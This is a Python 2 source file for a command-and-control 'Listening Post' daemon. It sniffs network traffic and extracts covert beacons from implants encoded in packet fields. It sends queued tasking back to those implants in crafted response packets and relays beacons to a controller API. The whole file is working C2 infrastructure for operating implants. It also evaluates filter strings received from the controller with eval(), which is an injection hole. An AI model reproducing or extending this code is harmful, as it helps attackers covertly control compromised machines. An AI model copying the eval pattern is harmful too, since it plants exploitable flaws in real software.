#! /usr/bin/env python
import sys
from scapy.all import *  # noqa
import json

from daemon import Daemon
from datapoller import DataPoller
from filters import get_scapy_filter_from_querybuilder_rules
from utils import get_byte_size
from messages import (
    Beacon, BEACON_TYPES, message_test_data)
import api

from lpexceptions import MalformedBeacon

from message_responses.responses import get_response_by_name


class BeaconFilterList(list):

    def __init__(self, *args, **kwargs):
        super(BeaconFilterList, self).__init__(*args)
        self.on_add = kwargs.pop('on_add', None)
        self.on_remove = kwargs.pop('on_remove', None)

    def beacon_update(self, list2):

        if self == list2:
            # Beacon Filter queue is up-to-date
            return

        for filter in list2:
            if filter not in self:
                # Execute callback method for New or Updated Beacon Filter
                self.on_add(filter)

        for filter in self:
            if filter not in list2:
                # Execute callback method for Removal of a Beacon Filter
                self.on_remove(filter)


class ImplantTaskQueue(dict):

    def __init__(self, *args, **kwargs):
        super(ImplantTaskQueue, self).__init__(*args, **kwargs)

    def __delitem__(self, key):
        # Remove task from controller
        super(ImplantTaskQueue, self).__delitem__(key)

    def add_task(self, implant_uuid, task):
        print "Add task: %s ==> %s" % (implant_uuid, task)
        print "implant_uuid type: %s" % type(implant_uuid)
        if implant_uuid not in self.keys():
            self[implant_uuid] = list()
        self[implant_uuid].append(task)

    def remove_task(self, implant_uuid, task):
        if task in self[implant_uuid]:
            self[implant_uuid].remove(task)
        if len(self[implant_uuid]) < 1:
            del self[implant_uuid]
        #api.remove_task(implant_uuid, task['id'])

    def get_next_task(self, implant_uuid):
        print "check for tasks: %s" % implant_uuid
        print "implant_uuid type: %s" % type(implant_uuid)
        print self.__dict__
        if implant_uuid in self.keys():
            print "Found task for %s => %s" % (implant_uuid, self[implant_uuid][0])
            return self[implant_uuid][0]
        return None


class LP(Daemon):
    """Listening Post (LP) service for receiving and processing Command &
    Control Beacons from implants.

    This LP allows the user to register custom handlers for different packet
    types.
    For example, the user could have a DNS beacon handler that processes
    only DNS packets.

    Attributes:
        verbose:    Enables verbose logging
        handlers:   Stores registered handlers
    """

    def __init__(self, *args, **kwargs):
        """Constructor

        """
        super(LP, self).__init__(*args, **kwargs)
        self.verbose = False
        self.filters = {}
        self.beacon_filters = BeaconFilterList(
            on_add=self._new_beacon_filter_callback,
            on_remove=self._remove_beacon_filter_callback)
        self.task_queue = ImplantTaskQueue()

    def _pkt_handler(self, pkt):
        """Process a packet

        :type pkt: scapy.Packet
        :param pkt: Packet to be processed
        """
        for lambda_filter, beacon_filter in self.filters.iteritems():
            packet = filter(lambda_filter, pkt)

            if packet:
                # Packet matches a registered filter
                self._log("Packet matches filter: %s" % lambda_filter)

                for beacon_data in beacon_filter:
                    data_map_list = json.loads(
                        beacon_data['beacon_data_mapping'])

                    try:
                        beacon = self.extract_beacon_from_packet(
                            packet[0], data_map_list)
                    except:
                        print "Error trying to extract beacon"
                        return

                    self._log("Received beacon: %s" % beacon)
                    self._log("Received beacon.type: %s" % beacon.type)

                    # Process any queued tasking for this implant
                    task = self.task_queue.get_next_task(beacon.uuid)
                    if task:
                        print "Beacon has tasking: %s" % task
                        self.send_implant_task(
                            pkt,
                            beacon_data['response_data_type'],
                            json.loads(beacon_data['response_data_mapping']),
                            task)
                        self.task_queue.remove_task(beacon.uuid, task)

                    self.send_beacon_to_controller(beacon)

    def send_implant_task(
            self, pkt, response_data_type, response_data_mapping, task):
        """Send tasking to an Implant by responding to a Beacon"""
        self._log("Sending task to implant: %s" % task)

        response_factory = get_response_by_name(response_data_type)()
        response = response_factory.create_response(pkt)
        response_factory.add_response_data(
            response, task, response_data_mapping)
        # Send the response packet
        send(response)

    def send_beacon_to_controller(self, beacon):
        api.send_beacon(beacon)

    def _parse_data_map(self, data_map_list):
        data_mapping_dict = {}

        # Figure out which beacon fields are packed into
        # the same packet field
        for packet_field, beacon_field in data_map_list:
            if packet_field in data_mapping_dict:
                data_mapping_dict[packet_field].append(beacon_field)
            else:
                data_mapping_dict[packet_field] = [beacon_field]
        return data_mapping_dict

    def extract_beacon_from_packet(self, packet, data_map_list):
        """
        packet: scapy Packet object
        list_of_beacon_data_mappings: list of data mappings
        """

        beacon = Beacon()
        beacon.external_ip_address = packet['IP'].src

        mapped_data = self._parse_data_map(data_map_list).iteritems()

        for packet_field, beacon_fields in mapped_data:
            field_protocol, field_subfield = packet_field.split(".")

            # Use scapy to extract the data from the packet field
            layer = packet.getlayer(eval(field_protocol))
            packet_field_value = layer.getfieldval(field_subfield)
            """
            packet_field_value = eval(
                "packet['%s'].%s" % (field_protocol, field_subfield))
            """

            if len(beacon_fields) > 1:
                # More than one beacon field within same packet field

                offset = 0
                for beacon_field in beacon_fields:
                    data_size = get_byte_size(
                        message_test_data[beacon_field])
                    if beacon_field == 'data':
                        try:
                            data_size = beacon.data_length
                        except AttributeError:
                            # Normal if Beacon doesn't contain data
                            data_size = 0
                    if beacon_field == 'data_length' and not (
                            beacon.type == BEACON_TYPES['data']):
                        beacon['%s' % beacon_field] = 0
                        continue
                    try:
                        beacon['%s' % beacon_field] = packet_field_value[
                            offset:offset+data_size]
                        self._log("beacon[%s] => %s" % (beacon_field, packet_field_value[
                            offset:offset+data_size].encode('hex')))
                    except MalformedBeacon, e:
                        print "Malformed Beacon: ", e
                        break

                    offset += data_size
            else:
                beacon['%s' % beacon_field] = packet_field_value
        return beacon

    def _new_beacon_filter_callback(self, beacon_filter):
        """Callback method called when a new filter is added to the queue"""
        self._log("Adding Beacon Filter")
        scapy_filter = eval(get_scapy_filter_from_querybuilder_rules(
            beacon_filter['beacon_filter']))
        self.register_filter(scapy_filter, beacon_filter)
        self.beacon_filters.append(beacon_filter)

    def _remove_beacon_filter_callback(self, beacon_filter):
        """Callback method called when a filter is removed from the queue"""
        self._log("Remove Beacon from the list")
        scapy_filter = eval(get_scapy_filter_from_querybuilder_rules(
            beacon_filter['beacon_filter']))
        self.unregister_filter(scapy_filter, beacon_filter)
        self.beacon_filters.remove(beacon_filter)

    def register_filter(self, scapy_filter, beacon_filter):
        """Add a new packet filter
        """
        try:
            if beacon_filter not in self.filters[scapy_filter]:
                self.filters[scapy_filter].append(beacon_filter)
        except KeyError:
            self.filters[scapy_filter] = [beacon_filter]

        self._log("Registered new filter: %s\n%s" % (
            scapy_filter, beacon_filter))

    def unregister_filter(self, scapy_filter, beacon_filter):
        """Remove a packet handler from the list of handlers"""
        if len(self.filters[scapy_filter]) == 1:
            del self.filters[scapy_filter]
        else:
            self.filters[scapy_filter].remove(beacon_filter)

    def _log(self, msg, msg_type="Info"):
        """Private logger for messages"""
        if self.verbose:
            sys.stderr.write("%s\n" % str(msg))
            api.send_log(msg, msg_type)

    def _start_sniff(self):
        """Start listening for incoming packets"""
        self._log("Starting the packet sniffer")
        sniff(prn=self._pkt_handler, store=0)

    def start_data_poller(self):
        self._log("Starting the data poller")
        self.dp = DataPoller(
            beacon_filters=self.beacon_filters,
            logger=self._log, task_queue=self.task_queue)
        self.dp.start()

    def stop(self):
        self.dp.stop()
        super(LP, self).stop()

    def run(self):
        """Run forever"""
        self.start_data_poller()
        self._start_sniff()


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(prog='Lp')

    parser.add_argument("-v", "--verbose", help="increase output verbosity",
                        action="store_true", default=False)

    parser.add_argument("-d", "--daemon", help="run in background (daemonize)",
                        choices=['start', 'stop', 'restart'],
                        default=False)

    args = parser.parse_args()

    lp = LP('/var/run/lp.pid')
    lp.verbose = args.verbose

    # TCP Handler
    def _handler_tcp(pkt):
        print "Called tcp handler"

    _filter_tcp = lambda p: TCP in p
    #lp.register_handler(_filter_tcp, _handler_tcp)

    # UDP Handler
    def _handler_udp(pkt):
        print "Called udp handler"

    _filter_udp = lambda p: UDP in p
    #lp.register_handler(_filter_udp, _handler_udp)

    if args.daemon == 'start':
        print "Starting"
        lp.start()
    elif args.daemon == 'stop':
        print "Stopping"
        lp.stop()
    elif args.daemon == 'restart':
        print "Restarting"
        lp.restart()
    else:
        lp.run()
